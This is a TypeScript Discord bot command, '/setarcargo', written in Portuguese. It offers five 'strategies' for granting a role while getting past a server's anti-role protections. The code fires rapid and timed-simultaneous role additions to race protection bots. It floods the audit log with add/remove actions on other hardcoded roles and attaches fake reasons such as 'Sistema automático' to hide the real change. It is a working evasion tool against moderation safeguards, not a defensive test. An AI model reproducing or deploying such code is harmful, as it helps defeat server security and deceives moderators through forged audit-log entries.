import { 
    SlashCommandBuilder, 
    ChatInputCommandInteraction, 
    EmbedBuilder,
    GuildMember,
    Guild
} from 'discord.js';
import { isOwner } from '../utils/permissions.ts';
import { logger } from '../utils/logger.ts';

export default {
    data: new SlashCommandBuilder()
        .setName('setarcargo')
        .setDescription('Testa estratégias para burlar sistemas anti-cargo')
        .addIntegerOption(option =>
            option.setName('estrategia')
                .setDescription('Estratégia a ser usada (1-5)')
                .setRequired(true)
                .addChoices(
                    { name: '1 - Explorar Timing de Processamento', value: 1 },
                    { name: '2 - Sobrecarga de Audit Log', value: 2 },
                    { name: '3 - Usar Permissões Diferentes', value: 3 },
                    { name: '4 - Explorar Race Conditions', value: 4 },
                    { name: '5 - Método de Camuflagem', value: 5 }
                )
        )
        .addStringOption(option =>
            option.setName('cargo_id')
                .setDescription('ID do cargo a ser aplicado')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('user_id')
                .setDescription('ID do usuário que receberá o cargo')
                .setRequired(true)
        )
        .setDefaultMemberPermissions(null)
        .setDMPermission(false),

    async execute(interaction: ChatInputCommandInteraction) {
        try {
            const executor = interaction.member as GuildMember;
            
            // Verificar se é owner
            if (!isOwner(executor)) {
                await interaction.reply({
                    content: '❌ Apenas owners podem usar este comando.',
                    ephemeral: true
                });
                return;
            }

            const strategy = interaction.options.getInteger('estrategia', true);
            const roleId = interaction.options.getString('cargo_id', true);
            const userId = interaction.options.getString('user_id', true);

            // Buscar o membro e o cargo
            const member = await interaction.guild?.members.fetch(userId).catch(() => null);
            const role = await interaction.guild?.roles.fetch(roleId).catch(() => null);

            if (!member) {
                await interaction.reply({
                    content: '❌ Usuário não encontrado no servidor.',
                    ephemeral: true
                });
                return;
            }

            if (!role) {
                await interaction.reply({
                    content: '❌ Cargo não encontrado no servidor.',
                    ephemeral: true
                });
                return;
            }

            const strategyNames = [
                '',
                'Explorar Timing de Processamento',
                'Sobrecarga de Audit Log',
                'Usar Permissões Diferentes',
                'Explorar Race Conditions',
                'Método de Camuflagem'
            ];

            await interaction.reply({
                content: `🔄 Iniciando estratégia **${strategy} - ${strategyNames[strategy]}** para aplicar cargo **${role.name}** em **${member.displayName}**...`,
                ephemeral: true
            });

            console.log(`[SETARCARGO] Estratégia ${strategy} iniciada para ${member.displayName} (${userId}) com cargo ${role.name} (${roleId})`);
            console.log(`[SETARCARGO] Executor: ${executor.displayName} (${executor.id})`);

            let success = false;
            const startTime = Date.now();

            try {
                switch (strategy) {
                    case 1:
                        success = await exploitAuditDelay(member, roleId);
                        break;
                    case 2:
                        success = await overloadAuditLog(interaction.guild!, member, roleId);
                        break;
                    case 3:
                        success = await usePermissionDifferences(member, roleId, executor);
                        break;
                    case 4:
                        success = await raceConditionExploit(member, roleId);
                        break;
                    case 5:
                        success = await camouflageMethod(member, roleId);
                        break;
                    default:
                        throw new Error('Estratégia inválida');
                }
            } catch (error) {
                console.log(`[SETARCARGO] Erro na estratégia ${strategy}:`, error);
            }

            const executionTime = Date.now() - startTime;

            // Verificação final
            await member.fetch();
            const finalCheck = member.roles.cache.has(roleId);
            
            if (finalCheck) {
                success = true;
            }

            console.log(`[SETARCARGO] Estratégia ${strategy} finalizada. Sucesso: ${success}, Tempo: ${executionTime}ms`);

            const embed = new EmbedBuilder()
                .setTitle(success ? '✅ Estratégia Bem-Sucedida' : '❌ Estratégia Falhou')
                .setDescription(`**Estratégia ${strategy}**: ${strategyNames[strategy]}`)
                .addFields(
                    { name: '👤 Usuário', value: `<@${member.id}>`, inline: true },
                    { name: '🎭 Cargo', value: `<@&${roleId}>`, inline: true },
                    { name: '⏱️ Tempo', value: `${executionTime}ms`, inline: true },
                    { name: '📊 Status Final', value: finalCheck ? 'Cargo presente' : 'Cargo ausente', inline: false }
                )
                .setColor(success ? 0x00FF00 : 0xFF0000)
                .setTimestamp();

            await interaction.editReply({
                content: null,
                embeds: [embed]
            });

        } catch (error) {
            logger.error({ error }, 'Erro no comando /setarcargo');
            
            const errorMessage = 'Ocorreu um erro ao executar o comando.';
            
            if (interaction.replied || interaction.deferred) {
                await interaction.followUp({
                    content: `❌ ${errorMessage}`,
                    ephemeral: true
                });
            } else {
                await interaction.reply({
                    content: `❌ ${errorMessage}`,
                    ephemeral: true
                });
            }
        }
    }
};

// Estratégia 1: Explorar Timing de Processamento
async function exploitAuditDelay(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 1] Iniciando exploit de timing de audit delay');
    
    // Adicionar cargo
    await member.roles.add(roleId, 'Timing exploit - inicial');
    
    // Imediatamente fazer múltiplas ações para mascarar no audit log
    const rapidActions = Array(15).fill(null).map((_, i) => 
        member.roles.add(roleId, `Timing exploit - ${i + 1}`).catch(() => null)
    );
    
    await Promise.all(rapidActions);
    
    // Verificar se funcionou
    await member.fetch();
    return member.roles.cache.has(roleId);
}

// Estratégia 2: Sobrecarga de Audit Log
async function overloadAuditLog(guild: Guild, member: GuildMember, targetRole: string): Promise<boolean> {
    console.log('[STRATEGY 2] Iniciando sobrecarga de audit log');
    
    // Cargos legítimos para usar como "ruído"
    const legitimateRoles = [
        '1136850198618976296',
        '1411961007261356103', 
        '1136850286254764042',
        '1411961026194182224',
        '1136850296040067232',
        '1136850298548256788'
    ];
    
    const actions = [];
    
    // Adicionar o cargo alvo junto com vários outros
    actions.push(member.roles.add(targetRole, 'Overload - target'));
    
    // Adicionar/remover outros cargos para "poluir" o audit log
    legitimateRoles.forEach((roleId, index) => {
        actions.push(member.roles.add(roleId, `Overload - add ${index}`).catch(() => null));
        setTimeout(() => {
            member.roles.remove(roleId, `Overload - remove ${index}`).catch(() => null);
        }, 10 + index);
    });
    
    await Promise.all(actions);
    
    // Aguardar um pouco e verificar
    await new Promise(resolve => setTimeout(resolve, 100));
    await member.fetch();
    return member.roles.cache.has(targetRole);
}

// Estratégia 3: Usar Permissões Diferentes
async function usePermissionDifferences(member: GuildMember, roleId: string, executor: GuildMember): Promise<boolean> {
    console.log('[STRATEGY 3] Iniciando exploit de permissões diferentes');
    
    const reasons = [
        'Sistema automático',
        'Verificação de segurança',
        'Atualização de permissões',
        'Sincronização de dados',
        'Processo interno',
        `Executado por ${executor.displayName}`,
        'Correção de estado',
        'Manutenção programada'
    ];
    
    for (const reason of reasons) {
        try {
            await member.roles.add(roleId, reason);
            await new Promise(resolve => setTimeout(resolve, 5));
        } catch (error) {
            // Ignorar erros individuais
        }
    }
    
    await member.fetch();
    return member.roles.cache.has(roleId);
}

// Estratégia 4: Explorar Race Conditions
async function raceConditionExploit(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 4] Iniciando exploit de race conditions');
    
    // Criar múltiplas promessas que executam exatamente ao mesmo tempo
    const timestamp = Date.now() + 50; // 50ms no futuro
    
    const promises = Array(25).fill(null).map((_, i) => 
        new Promise(resolve => {
            const delay = timestamp - Date.now();
            setTimeout(() => {
                member.roles.add(roleId, `Race condition ${i + 1}`)
                    .then(resolve)
                    .catch(resolve);
            }, Math.max(0, delay));
        })
    );
    
    await Promise.all(promises);
    
    await member.fetch();
    return member.roles.cache.has(roleId);
}

// Estratégia 5: Método de Camuflagem
async function camouflageMethod(member: GuildMember, targetRole: string): Promise<boolean> {
    console.log('[STRATEGY 5] Iniciando método de camuflagem');
    
    // Cargos legítimos para camuflagem
    const legitimateRoles = [
        '1136850198618976296',
        '1411961007261356103', 
        '1136850286254764042'
    ];
    
    // Primeiro, adicionar alguns cargos "legítimos"
    for (const roleId of legitimateRoles.slice(0, 2)) {
        try {
            await member.roles.add(roleId, 'Camuflagem - preparação');
            await new Promise(resolve => setTimeout(resolve, 30));
        } catch (error) {
            // Ignorar se não conseguir adicionar
        }
    }
    
    // Depois, no meio de uma "atualização normal", adicionar o cargo alvo
    await Promise.all([
        member.roles.add(targetRole, 'Camuflagem - target'),
        member.roles.add(legitimateRoles[0], 'Camuflagem - re-add').catch(() => null),
        member.roles.remove(legitimateRoles[1], 'Camuflagem - remove').catch(() => null),
        member.roles.add(legitimateRoles[2], 'Camuflagem - add').catch(() => null)
    ]);
    
    // Aguardar e verificar
    await new Promise(resolve => setTimeout(resolve, 50));
    await member.fetch();
    return member.roles.cache.has(targetRole);
}
